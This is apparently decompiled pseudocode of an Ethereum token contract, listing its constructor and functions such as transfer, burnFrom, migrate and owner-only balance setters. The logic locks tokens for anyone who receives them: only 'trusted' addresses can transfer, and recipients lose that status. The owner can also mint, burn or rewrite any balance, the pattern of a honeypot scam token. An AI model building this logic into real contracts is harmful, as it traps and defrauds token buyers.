contract main {


// =======================  Init code  ======================


address stor0;
array of uint256 stor2;
array of uint256 stor3;
uint8 stor4;
uint256 stor5;
mapping of uint256 stor6;
mapping of uint8 stor8;
array of address stor9;

function _fallback() {
    mem[96 len -5953] = code.data[6475 len -5953]
    mem[64] = -5857
    stor0 = msg.sender
    stor6[address(msg.sender)] = 0
    stor8[stor0] = 1
    stor9.length++
    if not stor9.length <= stor9.length + 1:
        idx = stor9.length + 1
        while stor9.length > idx:
            uint256(stor9[idx]) = 0
            idx = idx + 1
            continue 
    address(stor9[stor9.length]) = stor0
    stor5 = 0
    stor2[] = Array(len=mem[mem[96] + 96], data=mem[mem[96] + 128 len mem[mem[96] + 96]])
    stor3[] = Array(len=mem[mem[160] + 96], data=mem[mem[160] + 128 len mem[mem[160] + 96]])
    stor4 = mem[159 len 1]
    return code.data[522 len 5953]
}



// =====================  Runtime code  =====================


#
#  - sub_867e7c27(?)
#
address stor0;
address stor1;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
uint256 sub_e0bc38cc;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
mapping of uint8 stor8;
array of address stor9;

function name() {
    return name[0 len name.length]
}

function totalSupply() {
    return sub_e0bc38cc
}

function decimals() {
    return decimals
}

function trusted(address arg1) {
    return bool(stor8[arg1])
}

function balanceOf(address arg1) {
    return balanceOf[address(arg1)]
}

function symbol() {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) {
    return allowance[address(arg1)][address(arg2)]
}

function sub_e0bc38cc(?) {
    return sub_e0bc38cc
}

function _fallback() payable {
    revert
}

function confirmOwner() {
    require stor1 == msg.sender
    stor0 = stor1
    stor1 = 0
}

function changeOwner(address arg1) {
    if stor0 != msg.sender:
        require stor0 == tx.origin
    require arg1
    stor1 = arg1
}

function sub_3cb33e59(?) {
    if stor0 != msg.sender:
        require stor0 == tx.origin
    sub_e0bc38cc += arg1
    balanceOf[stor0] += arg1
}

function setTrusted(address arg1, bool arg2) {
    if stor0 != msg.sender:
        require stor0 == tx.origin
    stor8[address(arg1)] = uint8(arg2)
}

function approve(address arg1, uint256 arg2) {
    require arg1
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function burnFrom(address arg1, uint256 arg2) {
    if stor0 != msg.sender:
        require stor0 == tx.origin
    require balanceOf[address(arg1)] >= arg2
    balanceOf[address(arg1)] -= arg2
    sub_e0bc38cc -= arg2
    emit Burn(arg2, arg1);
    emit Transfer(arg2, arg1, 0);
    return 1
}

function transfer(address arg1, uint256 arg2) {
    require arg1
    require stor8[address(msg.sender)]
    require balanceOf[address(msg.sender)] >= arg2
    require balanceOf[address(arg1)] + arg2 > balanceOf[address(arg1)]
    balanceOf[address(msg.sender)] -= arg2
    balanceOf[arg1] += arg2
    idx = 0
    while idx < stor9.length:
        mem[0] = 9
        if address(stor9[idx]) != arg1:
            idx = idx + 1
            continue 
        emit Transfer(arg2, msg.sender, arg1);
        return 1
    stor9.length++
    if not stor9.length <= stor9.length + 1:
        idx = stor9.length + 1
        while stor9.length > idx:
            uint256(stor9[idx]) = 0
            idx = idx + 1
            continue 
    address(stor9[stor9.length]) = arg1
    stor8[address(arg1)] = 0
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferTo(address arg1, address arg2, uint256 arg3) {
    if stor0 != msg.sender:
        require stor0 == tx.origin
    require arg2
    require stor8[address(arg1)]
    require balanceOf[address(arg1)] >= arg3
    require balanceOf[address(arg2)] + arg3 > balanceOf[address(arg2)]
    balanceOf[address(arg1)] -= arg3
    balanceOf[arg2] += arg3
    idx = 0
    while idx < stor9.length:
        mem[0] = 9
        if address(stor9[idx]) != arg2:
            idx = idx + 1
            continue 
        emit Transfer(arg3, arg1, arg2);
        return 1
    stor9.length++
    if not stor9.length <= stor9.length + 1:
        idx = stor9.length + 1
        while stor9.length > idx:
            uint256(stor9[idx]) = 0
            idx = idx + 1
            continue 
    address(stor9[stor9.length]) = arg2
    stor8[address(arg2)] = 0
    emit Transfer(arg3, arg1, arg2);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require allowance[address(arg1)][address(msg.sender)] >= arg3
    allowance[address(arg1)][address(msg.sender)] -= arg3
    require arg2
    require stor8[address(arg1)]
    require balanceOf[address(arg1)] >= arg3
    require balanceOf[address(arg2)] + arg3 > balanceOf[address(arg2)]
    balanceOf[address(arg1)] -= arg3
    balanceOf[arg2] += arg3
    idx = 0
    while idx < stor9.length:
        mem[0] = 9
        if address(stor9[idx]) != arg2:
            idx = idx + 1
            continue 
        emit Transfer(arg3, arg1, arg2);
        return 1
    stor9.length++
    if not stor9.length <= stor9.length + 1:
        idx = stor9.length + 1
        while stor9.length > idx:
            uint256(stor9[idx]) = 0
            idx = idx + 1
            continue 
    address(stor9[stor9.length]) = arg2
    stor8[address(arg2)] = 0
    emit Transfer(arg3, arg1, arg2);
    return 1
}

function sub_09901f70(?) {
    if stor0 != msg.sender:
        require stor0 == tx.origin
    require arg1
    idx = 0
    while idx < stor9.length:
        mem[0] = 9
        if address(stor9[idx]) != arg1:
            idx = idx + 1
            continue 
        if balanceOf[address(arg1)] < arg2:
            balanceOf[address(arg1)] = arg2
            emit Transfer((arg2 - balanceOf[address(arg1)]), 0, arg1);
            emit Deposit((arg2 - balanceOf[address(arg1)]), arg1);
        else:
            if balanceOf[address(arg1)] > arg2:
                balanceOf[address(arg1)] = arg2
                emit Transfer((balanceOf[address(arg1)] - arg2), arg1, 0);
                emit Withdraw((balanceOf[address(arg1)] - arg2), arg1);
    stor9.length++
    if not stor9.length <= stor9.length + 1:
        idx = stor9.length + 1
        while stor9.length > idx:
            uint256(stor9[idx]) = 0
            idx = idx + 1
            continue 
    address(stor9[stor9.length]) = arg1
    stor8[address(arg1)] = 0
    if balanceOf[address(arg1)] < arg2:
        balanceOf[address(arg1)] = arg2
        emit Transfer((arg2 - balanceOf[address(arg1)]), 0, arg1);
        emit Deposit((arg2 - balanceOf[address(arg1)]), arg1);
    else:
        if balanceOf[address(arg1)] > arg2:
            balanceOf[address(arg1)] = arg2
            emit Transfer((balanceOf[address(arg1)] - arg2), arg1, 0);
            emit Withdraw((balanceOf[address(arg1)] - arg2), arg1);
}

function migrate(address arg1, address arg2) {
    if stor0 != msg.sender:
        require stor0 == tx.origin
    require arg1
    require arg2
    require ext_code.size(arg1)
    call arg1.0x70a08231 with:
         gas gas_remaining wei
        args arg2
    require ext_call.success
    require ext_code.size(arg1)
    call arg1.0x79cc6790 with:
         gas gas_remaining wei
        args address(arg2), ext_call.return_data[0]
    require ext_call.success
    if stor0 != msg.sender:
        require stor0 == tx.origin
    sub_e0bc38cc += ext_call.return_data[0]
    balanceOf[stor0] += ext_call.return_data[0]
    require arg2
    require stor8[stor0]
    require balanceOf[stor0] >= ext_call.return_data[0]
    require balanceOf[address(arg2)] + ext_call.return_data[0] > balanceOf[address(arg2)]
    balanceOf[stor0] -= ext_call.return_data[0]
    balanceOf[arg2] += ext_call.return_data[0]
    idx = 0
    while idx < stor9.length:
        mem[0] = 9
        if address(stor9[idx]) != arg2:
            idx = idx + 1
            continue 
        emit Transfer(ext_call.return_data[0], stor0, arg2);
        return 1
    stor9.length++
    if not stor9.length <= stor9.length + 1:
        idx = stor9.length + 1
        while stor9.length > idx:
            uint256(stor9[idx]) = 0
            idx = idx + 1
            continue 
    address(stor9[stor9.length]) = arg2
    stor8[address(arg2)] = 0
    emit Transfer(ext_call.return_data[0], stor0, arg2);
    return 1
}

function sub_9b96ccb2(?) {
    mem[128 len 32 * arg2.length] = call.data[arg2 + 36 len 32 * arg2.length]
    if stor0 == msg.sender:
        idx = 0
        while idx < arg2.length:
            require idx < arg2.length
            _236 = mem[(32 * idx) + 128]
            if stor0 == msg.sender:
                require arg1
                require mem[(32 * idx) + 140 len 20]
                require ext_code.size(arg1)
                call arg1.0x70a08231 with:
                     gas gas_remaining wei
                    args mem[(32 * idx) + 140 len 20]
                require ext_call.success
                mem[(32 * arg2.length) + 132] = mem[(32 * idx) + 140 len 20]
                mem[(32 * arg2.length) + 164] = ext_call.return_data[0]
                require ext_code.size(arg1)
                call arg1.0x79cc6790 with:
                     gas gas_remaining wei
                    args mem[(32 * arg2.length) + 132], ext_call.return_data[0]
                require ext_call.success
                if stor0 == msg.sender:
                    sub_e0bc38cc += ext_call.return_data[0]
                    balanceOf[stor0] += ext_call.return_data[0]
                    require address(_236)
                    require stor8[stor0]
                    require balanceOf[stor0] >= ext_call.return_data[0]
                    require balanceOf[address(_236)] + ext_call.return_data[0] > balanceOf[address(_236)]
                    balanceOf[stor0] -= ext_call.return_data[0]
                    balanceOf[address(_236)] += ext_call.return_data[0]
                    s = 0
                    while s < stor9.length:
                        mem[0] = 9
                        if address(stor9[s]) != address(_236):
                            s = s + 1
                            continue 
                        mem[0] = 9
                        mem[(32 * arg2.length) + 128] = ext_call.return_data[0]
                        emit Transfer(ext_call.return_data[0], stor0, address(_236));
                        idx = idx + 1
                        continue 
                    stor9.length++
                    if not stor9.length <= stor9.length + 1:
                        s = stor9.length + sha3(9) + 1
                        while sha3(9) + stor9.length > s:
                            stor[s] = 0
                            s = s + 1
                            continue 
                    address(stor9[stor9.length]) = address(_236)
                    mem[32] = 8
                    stor8[address(_236)] = 0
                    mem[0] = address(_236)
                    mem[(32 * arg2.length) + 128] = ext_call.return_data[0]
                    emit Transfer(ext_call.return_data[0], stor0, address(_236));
                    idx = idx + 1
                    continue 
                require stor0 == tx.origin
                sub_e0bc38cc += ext_call.return_data[0]
                balanceOf[stor0] += ext_call.return_data[0]
                require address(_236)
                require stor8[stor0]
                require balanceOf[stor0] >= ext_call.return_data[0]
                require balanceOf[address(_236)] + ext_call.return_data[0] > balanceOf[address(_236)]
                balanceOf[stor0] -= ext_call.return_data[0]
                balanceOf[address(_236)] += ext_call.return_data[0]
                s = 0
                while s < stor9.length:
                    mem[0] = 9
                    if address(stor9[s]) != address(_236):
                        s = s + 1
                        continue 
                    mem[0] = 9
                    mem[(32 * arg2.length) + 128] = ext_call.return_data[0]
                    emit Transfer(ext_call.return_data[0], stor0, address(_236));
                    idx = idx + 1
                    continue 
                stor9.length++
                if not stor9.length > stor9.length + 1:
                    address(stor9[stor9.length]) = address(_236)
                    mem[32] = 8
                    stor8[address(_236)] = 0
                    mem[0] = address(_236)
                    mem[(32 * arg2.length) + 128] = ext_call.return_data[0]
                    emit Transfer(ext_call.return_data[0], stor0, address(_236));
                    idx = idx + 1
                    continue 
                s = stor9.length + sha3(9) + 1
                while sha3(9) + stor9.length > s:
                    stor[s] = 0
                    s = s + 1
                    continue 
                address(stor9[stor9.length]) = address(_236)
                mem[32] = 8
                stor8[address(_236)] = 0
                mem[0] = address(_236)
                mem[(32 * arg2.length) + 128] = ext_call.return_data[0]
                emit Transfer(ext_call.return_data[0], stor0, address(_236));
                s = stor9.length + sha3(9) + 1
                continue 
            require stor0 == tx.origin
            require arg1
            require mem[(32 * idx) + 140 len 20]
            require ext_code.size(arg1)
            call arg1.0x70a08231 with:
                 gas gas_remaining wei
                args mem[(32 * idx) + 140 len 20]
            require ext_call.success
            mem[(32 * arg2.length) + 132] = mem[(32 * idx) + 140 len 20]
            mem[(32 * arg2.length) + 164] = ext_call.return_data[0]
            require ext_code.size(arg1)
            call arg1.0x79cc6790 with:
                 gas gas_remaining wei
                args mem[(32 * arg2.length) + 132], ext_call.return_data[0]
            require ext_call.success
            if stor0 == msg.sender:
                sub_e0bc38cc += ext_call.return_data[0]
                balanceOf[stor0] += ext_call.return_data[0]
                require address(_236)
                require stor8[stor0]
                require balanceOf[stor0] >= ext_call.return_data[0]
                require balanceOf[address(_236)] + ext_call.return_data[0] > balanceOf[address(_236)]
                balanceOf[stor0] -= ext_call.return_data[0]
                balanceOf[address(_236)] += ext_call.return_data[0]
                s = 0
                while s < stor9.length:
                    mem[0] = 9
                    if address(stor9[s]) != address(_236):
                        s = s + 1
                        continue 
                    mem[0] = 9
                    mem[(32 * arg2.length) + 128] = ext_call.return_data[0]
                    emit Transfer(ext_call.return_data[0], stor0, address(_236));
                    idx = idx + 1
                    continue 
                stor9.length++
                if not stor9.length > stor9.length + 1:
                    address(stor9[stor9.length]) = address(_236)
                    mem[32] = 8
                    stor8[address(_236)] = 0
                    mem[0] = address(_236)
                    mem[(32 * arg2.length) + 128] = ext_call.return_data[0]
                    emit Transfer(ext_call.return_data[0], stor0, address(_236));
                    idx = idx + 1
                    continue 
                s = stor9.length + sha3(9) + 1
                while sha3(9) + stor9.length > s:
                    stor[s] = 0
                    s = s + 1
                    continue 
                address(stor9[stor9.length]) = address(_236)
                mem[32] = 8
                stor8[address(_236)] = 0
                mem[0] = address(_236)
                mem[(32 * arg2.length) + 128] = ext_call.return_data[0]
                emit Transfer(ext_call.return_data[0], stor0, address(_236));
                s = stor9.length + sha3(9) + 1
                continue 
            require stor0 == tx.origin
            sub_e0bc38cc += ext_call.return_data[0]
            balanceOf[stor0] += ext_call.return_data[0]
            require address(_236)
            require stor8[stor0]
            require balanceOf[stor0] >= ext_call.return_data[0]
            require balanceOf[address(_236)] + ext_call.return_data[0] > balanceOf[address(_236)]
            balanceOf[stor0] -= ext_call.return_data[0]
            balanceOf[address(_236)] += ext_call.return_data[0]
            s = 0
            while s < stor9.length:
                mem[0] = 9
                if address(stor9[s]) != address(_236):
                    s = s + 1
                    continue 
                mem[0] = 9
                mem[(32 * arg2.length) + 128] = ext_call.return_data[0]
                emit Transfer(ext_call.return_data[0], stor0, address(_236));
                idx = idx + 1
                continue 
            stor9.length++
            if not stor9.length <= stor9.length + 1:
                s = stor9.length + sha3(9) + 1
                while sha3(9) + stor9.length > s:
                    stor[s] = 0
                    s = s + 1
                    continue 
            address(stor9[stor9.length]) = address(_236)
            mem[32] = 8
            stor8[address(_236)] = 0
            mem[0] = address(_236)
            mem[(32 * arg2.length) + 128] = ext_call.return_data[0]
            emit Transfer(ext_call.return_data[0], stor0, address(_236));
            idx = idx + 1
            continue 
    else:
        require stor0 == tx.origin
        idx = 0
        while idx < arg2.length:
            require idx < arg2.length
            _237 = mem[(32 * idx) + 128]
            if stor0 == msg.sender:
                require arg1
                require mem[(32 * idx) + 140 len 20]
                require ext_code.size(arg1)
                call arg1.0x70a08231 with:
                     gas gas_remaining wei
                    args mem[(32 * idx) + 140 len 20]
                require ext_call.success
                mem[(32 * arg2.length) + 132] = mem[(32 * idx) + 140 len 20]
                mem[(32 * arg2.length) + 164] = ext_call.return_data[0]
                require ext_code.size(arg1)
                call arg1.0x79cc6790 with:
                     gas gas_remaining wei
                    args mem[(32 * arg2.length) + 132], ext_call.return_data[0]
                require ext_call.success
                if stor0 == msg.sender:
                    sub_e0bc38cc += ext_call.return_data[0]
                    balanceOf[stor0] += ext_call.return_data[0]
                    require address(_237)
                    require stor8[stor0]
                    require balanceOf[stor0] >= ext_call.return_data[0]
                    require balanceOf[address(_237)] + ext_call.return_data[0] > balanceOf[address(_237)]
                    balanceOf[stor0] -= ext_call.return_data[0]
                    balanceOf[address(_237)] += ext_call.return_data[0]
                    s = 0
                    while s < stor9.length:
                        mem[0] = 9
                        if address(stor9[s]) != address(_237):
                            s = s + 1
                            continue 
                        mem[0] = 9
                        mem[(32 * arg2.length) + 128] = ext_call.return_data[0]
                        emit Transfer(ext_call.return_data[0], stor0, address(_237));
                        idx = idx + 1
                        continue 
                    stor9.length++
                    if not stor9.length <= stor9.length + 1:
                        s = stor9.length + sha3(9) + 1
                        while sha3(9) + stor9.length > s:
                            stor[s] = 0
                            s = s + 1
                            continue 
                    address(stor9[stor9.length]) = address(_237)
                    mem[32] = 8
                    stor8[address(_237)] = 0
                    mem[0] = address(_237)
                    mem[(32 * arg2.length) + 128] = ext_call.return_data[0]
                    emit Transfer(ext_call.return_data[0], stor0, address(_237));
                    idx = idx + 1
                    continue 
                require stor0 == tx.origin
                sub_e0bc38cc += ext_call.return_data[0]
                balanceOf[stor0] += ext_call.return_data[0]
                require address(_237)
                require stor8[stor0]
                require balanceOf[stor0] >= ext_call.return_data[0]
                require balanceOf[address(_237)] + ext_call.return_data[0] > balanceOf[address(_237)]
                balanceOf[stor0] -= ext_call.return_data[0]
                balanceOf[address(_237)] += ext_call.return_data[0]
                s = 0
                while s < stor9.length:
                    mem[0] = 9
                    if address(stor9[s]) != address(_237):
                        s = s + 1
                        continue 
                    mem[0] = 9
                    mem[(32 * arg2.length) + 128] = ext_call.return_data[0]
                    emit Transfer(ext_call.return_data[0], stor0, address(_237));
                    idx = idx + 1
                    continue 
                stor9.length++
                if not stor9.length > stor9.length + 1:
                    address(stor9[stor9.length]) = address(_237)
                    mem[32] = 8
                    stor8[address(_237)] = 0
                    mem[0] = address(_237)
                    mem[(32 * arg2.length) + 128] = ext_call.return_data[0]
                    emit Transfer(ext_call.return_data[0], stor0, address(_237));
                    idx = idx + 1
                    continue 
                s = stor9.length + sha3(9) + 1
                while sha3(9) + stor9.length > s:
                    stor[s] = 0
                    s = s + 1
                    continue 
                address(stor9[stor9.length]) = address(_237)
                mem[32] = 8
                stor8[address(_237)] = 0
                mem[0] = address(_237)
                mem[(32 * arg2.length) + 128] = ext_call.return_data[0]
                emit Transfer(ext_call.return_data[0], stor0, address(_237));
                s = stor9.length + sha3(9) + 1
                continue 
            require stor0 == tx.origin
            require arg1
            require mem[(32 * idx) + 140 len 20]
            require ext_code.size(arg1)
            call arg1.0x70a08231 with:
                 gas gas_remaining wei
                args mem[(32 * idx) + 140 len 20]
            require ext_call.success
            mem[(32 * arg2.length) + 132] = mem[(32 * idx) + 140 len 20]
            mem[(32 * arg2.length) + 164] = ext_call.return_data[0]
            require ext_code.size(arg1)
            call arg1.0x79cc6790 with:
                 gas gas_remaining wei
                args mem[(32 * arg2.length) + 132], ext_call.return_data[0]
            require ext_call.success
            if stor0 == msg.sender:
                sub_e0bc38cc += ext_call.return_data[0]
                balanceOf[stor0] += ext_call.return_data[0]
                require address(_237)
                require stor8[stor0]
                require balanceOf[stor0] >= ext_call.return_data[0]
                require balanceOf[address(_237)] + ext_call.return_data[0] > balanceOf[address(_237)]
                balanceOf[stor0] -= ext_call.return_data[0]
                balanceOf[address(_237)] += ext_call.return_data[0]
                s = 0
                while s < stor9.length:
                    mem[0] = 9
                    if address(stor9[s]) != address(_237):
                        s = s + 1
                        continue 
                    mem[0] = 9
                    mem[(32 * arg2.length) + 128] = ext_call.return_data[0]
                    emit Transfer(ext_call.return_data[0], stor0, address(_237));
                    idx = idx + 1
                    continue 
                stor9.length++
                if not stor9.length > stor9.length + 1:
                    address(stor9[stor9.length]) = address(_237)
                    mem[32] = 8
                    stor8[address(_237)] = 0
                    mem[0] = address(_237)
                    mem[(32 * arg2.length) + 128] = ext_call.return_data[0]
                    emit Transfer(ext_call.return_data[0], stor0, address(_237));
                    idx = idx + 1
                    continue 
                s = stor9.length + sha3(9) + 1
                while sha3(9) + stor9.length > s:
                    stor[s] = 0
                    s = s + 1
                    continue 
                address(stor9[stor9.length]) = address(_237)
                mem[32] = 8
                stor8[address(_237)] = 0
                mem[0] = address(_237)
                mem[(32 * arg2.length) + 128] = ext_call.return_data[0]
                emit Transfer(ext_call.return_data[0], stor0, address(_237));
                s = stor9.length + sha3(9) + 1
                continue 
            require stor0 == tx.origin
            sub_e0bc38cc += ext_call.return_data[0]
            balanceOf[stor0] += ext_call.return_data[0]
            require address(_237)
            require stor8[stor0]
            require balanceOf[stor0] >= ext_call.return_data[0]
            require balanceOf[address(_237)] + ext_call.return_data[0] > balanceOf[address(_237)]
            balanceOf[stor0] -= ext_call.return_data[0]
            balanceOf[address(_237)] += ext_call.return_data[0]
            s = 0
            while s < stor9.length:
                mem[0] = 9
                if address(stor9[s]) != address(_237):
                    s = s + 1
                    continue 
                mem[0] = 9
                mem[(32 * arg2.length) + 128] = ext_call.return_data[0]
                emit Transfer(ext_call.return_data[0], stor0, address(_237));
                idx = idx + 1
                continue 
            stor9.length++
            if not stor9.length <= stor9.length + 1:
                s = stor9.length + sha3(9) + 1
                while sha3(9) + stor9.length > s:
                    stor[s] = 0
                    s = s + 1
                    continue 
            address(stor9[stor9.length]) = address(_237)
            mem[32] = 8
            stor8[address(_237)] = 0
            mem[0] = address(_237)
            mem[(32 * arg2.length) + 128] = ext_call.return_data[0]
            emit Transfer(ext_call.return_data[0], stor0, address(_237));
            idx = idx + 1
            continue 
}



}
